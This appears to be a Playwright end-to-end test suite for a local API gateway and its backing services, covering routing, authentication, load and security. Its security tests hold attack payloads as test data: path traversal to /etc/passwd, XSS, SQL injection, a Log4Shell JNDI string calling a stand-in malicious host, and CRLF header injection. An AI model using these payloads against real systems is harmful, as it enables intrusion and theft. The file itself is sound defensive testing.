/**
 * Gateway Service E2E Tests - Phase 2.1.3
 * 
 * Complete end-to-end testing covering:
 * - Complete request routing flows
 * - Multi-service communication patterns
 * - Authentication across services
 * - Performance under load
 * - Security vulnerability testing
 * 
 * Uses real service connections with authentic validation
 */

import { test, expect, Page } from '@playwright/test';

const GATEWAY_BASE_URL = 'http://localhost:4000';
const SERVICE_PORTS = {
  gateway: 4000,
  codai: 4001,
  admin: 4002,
  hub: 4003,
  id: 4004,
  bancai: 4005,
  memorai: 4006
};

test.describe('Gateway Service E2E Tests - Phase 2.1.3', () => {

  test.describe('Complete Request Routing Flows', () => {
    test('should handle complete CODAI service request flow', async ({ request }) => {
      // Step 1: Check Gateway health
      const gatewayHealth = await request.get(`${GATEWAY_BASE_URL}/api/gateway/health`);
      expect([200, 503].includes(gatewayHealth.status())).toBe(true);

      // Step 2: Route health request through Gateway to CODAI
      const codaiHealthViaGateway = await request.get(`${GATEWAY_BASE_URL}/api/v1/codai/health`);
      expect([200, 401].includes(codaiHealthViaGateway.status())).toBe(true);

      // Step 3: Direct CODAI service comparison
      const codaiHealthDirect = await request.get(`http://localhost:${SERVICE_PORTS.codai}/health`);
      expect(codaiHealthDirect.status()).toBe(200);

      // Step 4: Validate response consistency (if both successful)
      if (codaiHealthViaGateway.status() === 200 && codaiHealthDirect.status() === 200) {
        const gatewayResponse = await codaiHealthViaGateway.json();
        const directResponse = await codaiHealthDirect.json();
        
        expect(gatewayResponse).toHaveProperty('status');
        expect(directResponse).toHaveProperty('status');
        expect(gatewayResponse.service).toBe(directResponse.service);
      }
    });

    test('should handle complete Admin service request flow', async ({ request }) => {
      // Complete flow: Gateway -> Admin service
      const adminHealthViaGateway = await request.get(`${GATEWAY_BASE_URL}/api/v1/admin/health`);
      expect([200, 401, 503].includes(adminHealthViaGateway.status())).toBe(true);

      // Direct Admin service comparison
      const adminHealthDirect = await request.get(`http://localhost:${SERVICE_PORTS.admin}/api/health`);
      expect(adminHealthDirect.status()).toBe(200);

      // Validate routing consistency
      if (adminHealthViaGateway.status() === 200) {
        const gatewayResponse = await adminHealthViaGateway.json();
        expect(gatewayResponse).toHaveProperty('status');
        expect(gatewayResponse.service).toBe('codai-admin-service');
      }
    });

    test('should handle complete Hub service request flow', async ({ request }) => {
      const hubHealthViaGateway = await request.get(`${GATEWAY_BASE_URL}/api/v1/hub/health`);
      expect([200, 401, 503].includes(hubHealthViaGateway.status())).toBe(true);

      const hubHealthDirect = await request.get(`http://localhost:${SERVICE_PORTS.hub}/api/health`);
      expect(hubHealthDirect.status()).toBe(200);

      if (hubHealthViaGateway.status() === 200) {
        const gatewayResponse = await hubHealthViaGateway.json();
        expect(gatewayResponse).toHaveProperty('status');
      }
    });
  });

  test.describe('Multi-Service Communication Patterns', () => {
    test('should coordinate requests across multiple services', async ({ request }) => {
      // Parallel requests to multiple services through Gateway
      const serviceRequests = [
        request.get(`${GATEWAY_BASE_URL}/api/v1/codai/health`),
        request.get(`${GATEWAY_BASE_URL}/api/v1/admin/health`),
        request.get(`${GATEWAY_BASE_URL}/api/v1/hub/health`),
        request.get(`${GATEWAY_BASE_URL}/api/v1/id/health`),
        request.get(`${GATEWAY_BASE_URL}/api/v1/bancai/health`),
        request.get(`${GATEWAY_BASE_URL}/api/v1/memorai/health`)
      ];

      const responses = await Promise.all(serviceRequests);

      // All services should respond (either success or auth required)
      responses.forEach((response, index) => {
        expect([200, 401, 503].includes(response.status())).toBe(true);
        console.log(`Service ${index}: ${response.status()}`);
      });

      // At least some services should be accessible
      const successfulResponses = responses.filter(r => r.status() === 200);
      expect(successfulResponses.length).toBeGreaterThan(0);
    });

    test('should handle service interdependencies', async ({ request }) => {
      // Test Gateway's handling of service dependencies
      const gatewayHealth = await request.get(`${GATEWAY_BASE_URL}/api/gateway/health`);
      expect([200, 503].includes(gatewayHealth.status())).toBe(true);

      if (gatewayHealth.status() === 503) {
        const healthData = await gatewayHealth.json();
        expect(healthData).toHaveProperty('success', false);
        expect(healthData).toHaveProperty('data');
        expect(healthData.data).toHaveProperty('services');
        
        // Validate service dependency tracking
        expect(Array.isArray(healthData.data.services)).toBe(true);
      }
    });

    test('should maintain service isolation', async ({ request }) => {
      // Ensure services are properly isolated through Gateway
      const isolationTests = [
        { service: 'codai', path: '/api/v1/codai/health' },
        { service: 'admin', path: '/api/v1/admin/health' },
        { service: 'hub', path: '/api/v1/hub/health' }
      ];

      for (const testCase of isolationTests) {
        const response = await request.get(`${GATEWAY_BASE_URL}${testCase.path}`);
        expect([200, 401, 503].includes(response.status())).toBe(true);
        
        // Check service-specific headers
        const headers = response.headers();
        expect(headers['x-service']).toBe(testCase.service);
      }
    });
  });

  test.describe('Authentication Across Services', () => {
    test('should enforce authentication for protected endpoints', async ({ request }) => {
      // Test protected endpoints without authentication
      const protectedEndpoints = [
        '/api/v1/admin/users',
        '/api/v1/hub/services',
        '/api/v1/id/profile',
        '/api/v1/bancai/transactions',
        '/api/v1/memorai/memories'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request.get(`${GATEWAY_BASE_URL}${endpoint}`);
        // Should require authentication (401) or service unavailable (503)
        expect([401, 404, 503].includes(response.status())).toBe(true);
      }
    });

    test('should handle invalid JWT tokens consistently', async ({ request }) => {
      const invalidToken = 'Bearer invalid-jwt-token-12345';
      
      const protectedServices = [
        '/api/v1/admin/health',
        '/api/v1/hub/health',
        '/api/v1/id/health'
      ];

      for (const endpoint of protectedServices) {
        const response = await request.get(`${GATEWAY_BASE_URL}${endpoint}`, {
          headers: { 'Authorization': invalidToken }
        });

        // Gateway may pass through to service for validation
        expect([200, 401, 403, 503].includes(response.status())).toBe(true);
      }
    });

    test('should validate authentication flow with real ID service', async ({ request }) => {
      // Test authentication flow through ID service
      const idHealthViaGateway = await request.get(`${GATEWAY_BASE_URL}/api/v1/id/health`);
      expect([200, 401, 503].includes(idHealthViaGateway.status())).toBe(true);

      // Direct ID service health check
      const idHealthDirect = await request.get(`http://localhost:${SERVICE_PORTS.id}/api/health`);
      expect(idHealthDirect.status()).toBe(200);

      if (idHealthDirect.status() === 200) {
        const healthData = await idHealthDirect.json();
        expect(healthData).toHaveProperty('status');
        expect(healthData).toHaveProperty('checks');
        // Check for authentication in the health checks
        if (healthData.checks && healthData.checks.auth) {
          expect(healthData.checks.auth).toHaveProperty('status');
        }
      }
    });
  });

  test.describe('Performance Under Load', () => {
    test('should handle concurrent requests efficiently', async ({ request }) => {
      const concurrentRequests = 50;
      const startTime = Date.now();

      // Create concurrent requests to Gateway
      const requests = Array.from({ length: concurrentRequests }, () => 
        request.get(`${GATEWAY_BASE_URL}/api/v1/codai/health`)
      );

      const responses = await Promise.all(requests);
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Performance assertions
      expect(totalTime).toBeLessThan(10000); // Should complete within 10 seconds
      expect(responses.length).toBe(concurrentRequests);

      // All requests should get valid responses
      responses.forEach(response => {
        expect([200, 401, 503].includes(response.status())).toBe(true);
      });

      // Calculate average response time
      const avgResponseTime = totalTime / concurrentRequests;
      expect(avgResponseTime).toBeLessThan(200); // Average under 200ms per request

      console.log(`Concurrent Load Test: ${concurrentRequests} requests in ${totalTime}ms (avg: ${avgResponseTime.toFixed(2)}ms)`);
    });

    test('should maintain performance under sustained load', async ({ request }) => {
      const iterations = 20;
      const batchSize = 10;
      const responseTimes: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const startTime = Date.now();
        
        const batchRequests = Array.from({ length: batchSize }, () => 
          request.get(`${GATEWAY_BASE_URL}/api/gateway/health`)
        );

        const responses = await Promise.all(batchRequests);
        const endTime = Date.now();
        
        responseTimes.push(endTime - startTime);

        // All responses should be valid
        responses.forEach(response => {
          expect([200, 503].includes(response.status())).toBe(true);
        });

        // Small delay between batches
        await new Promise(resolve => setTimeout(resolve, 100));
      }

      // Performance consistency check
      const avgResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
      const maxResponseTime = Math.max(...responseTimes);
      
      expect(avgResponseTime).toBeLessThan(1000); // Average batch under 1 second
      expect(maxResponseTime).toBeLessThan(3000); // No batch over 3 seconds

      console.log(`Sustained Load Test: Avg batch time: ${avgResponseTime.toFixed(2)}ms, Max: ${maxResponseTime}ms`);
    });

    test('should recover from temporary service overload', async ({ request }) => {
      // Stress test followed by recovery validation
      const stressRequests = Array.from({ length: 100 }, () => 
        request.get(`${GATEWAY_BASE_URL}/api/v1/codai/health`)
      );

      // Execute stress test
      const stressResponses = await Promise.all(stressRequests);
      
      // Wait for recovery
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Test recovery with normal requests
      const recoveryResponse = await request.get(`${GATEWAY_BASE_URL}/api/gateway/health`);
      expect([200, 503].includes(recoveryResponse.status())).toBe(true);

      // Ensure some stress requests succeeded
      const successfulStress = stressResponses.filter(r => r.status() === 200);
      console.log(`Stress Test: ${successfulStress.length}/100 requests successful`);
    });
  });

  test.describe('Security Vulnerability Testing', () => {
    test('should prevent path traversal attacks', async ({ request }) => {
      const pathTraversalPayloads = [
        '/api/v1/../../../etc/passwd',
        '/api/v1/codai/../admin/secrets',
        '/api/v1/admin/../../system/config',
        '/api/v1/hub/..%2F..%2Fsecrets'
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request.get(`${GATEWAY_BASE_URL}${payload}`);
        
        // Should not allow path traversal - expect 404, 400, 401, 403, or 503
        expect([400, 401, 404, 403, 503].includes(response.status())).toBe(true);
        
        // Should not return sensitive information
        if (response.status() !== 503) {
          const responseText = await response.text();
          expect(responseText).not.toContain('root:');
          expect(responseText).not.toContain('password');
          expect(responseText).not.toContain('secret');
        }
      }
    });

    test('should validate input sanitization', async ({ request }) => {
      const maliciousInputs = [
        '"><script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://malicious.com/a}',
        '%3Cscript%3Ealert(%27xss%27)%3C/script%3E'
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request.get(`${GATEWAY_BASE_URL}/api/v1/codai/health?query=${encodeURIComponent(maliciousInput)}`);
        
        expect([200, 400, 401, 404, 503].includes(response.status())).toBe(true);
        
        if (response.status() === 200) {
          const responseText = await response.text();
          // Response should not contain unescaped malicious input
          expect(responseText).not.toContain('<script>');
          expect(responseText).not.toContain('DROP TABLE');
          expect(responseText).not.toContain('jndi:ldap');
        }
      }
    });

    test('should enforce rate limiting for security', async ({ request }) => {
      // Rapid consecutive requests to test rate limiting
      const rapidRequests = Array.from({ length: 100 }, () => 
        request.get(`${GATEWAY_BASE_URL}/api/v1/codai/health`)
      );

      const responses = await Promise.all(rapidRequests);
      
      // Should handle all requests without crashing
      responses.forEach(response => {
        expect([200, 401, 429, 503].includes(response.status())).toBe(true);
      });

      // Check if rate limiting is enforced (429 Too Many Requests)
      const rateLimitedResponses = responses.filter(r => r.status() === 429);
      console.log(`Rate Limiting Test: ${rateLimitedResponses.length}/100 requests rate-limited`);
    });

    test('should protect against header injection', async ({ request }) => {
      const maliciousHeaders = {
        'X-Forwarded-For': '127.0.0.1\\r\\nX-Injected-Header: malicious',
        'User-Agent': 'Mozilla/5.0\\r\\nX-Injected: evil',
        'Referer': 'http://example.com\\r\\nX-Evil: injection'
      };

      for (const [headerName, headerValue] of Object.entries(maliciousHeaders)) {
        const response = await request.get(`${GATEWAY_BASE_URL}/api/gateway/health`, {
          headers: { [headerName]: headerValue }
        });

        expect([200, 400, 503].includes(response.status())).toBe(true);
        
        // Response should not contain injected headers
        const responseHeaders = response.headers();
        expect(responseHeaders['x-injected-header']).toBeUndefined();
        expect(responseHeaders['x-injected']).toBeUndefined();
        expect(responseHeaders['x-evil']).toBeUndefined();
      }
    });

    test('should validate CORS security policies', async ({ request }) => {
      // Test CORS with potentially malicious origins
      const maliciousOrigins = [
        'http://malicious.com',
        'https://evil.example',
        'null',
        'file://',
        'data:text/html,<script>alert("xss")</script>'
      ];

      for (const origin of maliciousOrigins) {
        const response = await request.get(`${GATEWAY_BASE_URL}/api/gateway/health`, {
          headers: { 'Origin': origin }
        });

        expect([200, 403, 503].includes(response.status())).toBe(true);
        
        // CORS should not allow arbitrary origins
        const corsHeader = response.headers()['access-control-allow-origin'];
        if (corsHeader) {
          expect(corsHeader).not.toBe(origin);
          expect(corsHeader).not.toBe('*'); // Should not be wildcard for security
        }
      }
    });
  });

  test.describe('Error Handling and Recovery', () => {
    test('should handle service unavailability gracefully', async ({ request }) => {
      // Test Gateway behavior when services are unavailable
      const gatewayHealth = await request.get(`${GATEWAY_BASE_URL}/api/gateway/health`);
      
      if (gatewayHealth.status() === 503) {
        const healthData = await gatewayHealth.json();
        expect(healthData).toHaveProperty('success', false);
        expect(healthData).toHaveProperty('data');
        
        // Should provide meaningful error information
        expect(healthData.data).toHaveProperty('gateway');
        expect(healthData.data).toHaveProperty('services');
      }
    });

    test('should provide detailed error responses', async ({ request }) => {
      // Test error response format for invalid endpoints
      const invalidResponse = await request.get(`${GATEWAY_BASE_URL}/api/v1/nonexistent/endpoint`);
      expect([404, 503].includes(invalidResponse.status())).toBe(true);

      if (invalidResponse.status() === 404) {
        const errorData = await invalidResponse.json();
        expect(errorData).toHaveProperty('error');
        expect(typeof errorData.error).toBe('string');
      }
    });
  });
});
